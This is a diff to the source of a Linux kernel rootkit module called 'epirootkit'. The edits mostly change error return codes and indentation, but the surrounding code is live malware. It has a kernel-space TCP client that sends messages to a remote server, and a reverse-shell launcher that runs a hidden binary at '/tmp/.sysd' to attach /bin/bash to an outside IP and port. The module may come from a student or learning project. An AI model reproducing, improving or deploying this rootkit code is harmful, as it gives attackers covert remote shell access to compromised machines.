@@ -47,7 +47,7 @@ int send_to_server(char *message)
 
 	if (!sock) {
 		pr_err("epirootkit: send_to_server: socket is NULL\n");
-		return FAILURE;
+		return -FAILURE;
 	}
 
 	vec.iov_base = message;
@@ -56,7 +56,7 @@ int send_to_server(char *message)
 	ret_code = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len);
 	if (ret_code < 0) {
 		pr_err("epirootkit: send_to_server: failed to send message: %d\n", ret_code);
-		return FAILURE;
+		return -FAILURE;
 	}
 
 	return SUCCESS;
@@ -68,11 +68,11 @@ void launch_reverse_shell(void)
 	snprintf(ip_port, sizeof(ip_port), "TCP:%s:%d", ip, REVERSE_SHELL_PORT);
 
 	char *argv[] = {
-        "/tmp/.sysd",
+		"/tmp/.sysd",
 		ip_port,
-        "EXEC:/bin/bash,pty,stderr,setsid,sigint,sane",
-        NULL
-    };
+		"EXEC:/bin/bash,pty,stderr,setsid,sigint,sane",
+		NULL
+	};
 
     char *envp[] = {
         "HOME=/",
@@ -106,14 +106,14 @@ int network_worker(void *data)
 	// Convert IP address string into 4-byte binary format
 	if (!in4_pton(ip, -1, ip_binary, -1, NULL)) {
 		pr_err("epirootkit: network_worker: invalid IPv4\n");
-		return FAILURE;
+		return -FAILURE;
 	}
 
 	// Create a TCP socket in kernel space
 	ret_code = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
 	if (ret_code < 0) {
 		pr_err("epirootkit: network_worker: socket creation failed: %d\n", ret_code);
-		return FAILURE;
+		return -FAILURE;
 	}
 
 	// Prepare the sockaddr_in structure for the server we want to connect to
@@ -149,7 +149,7 @@ int network_worker(void *data)
 	// If all attempts to send the message failed, abort
 	if (ret_code < 0) {
 		pr_err("epirootkit: network_worker: failed to send message after 10 attempts, giving up.\n");
-		return FAILURE;
+		return -FAILURE;
 	}
 
 	pr_info("epirootkit: network_worker: message sent to %s:%d\n", ip, port);
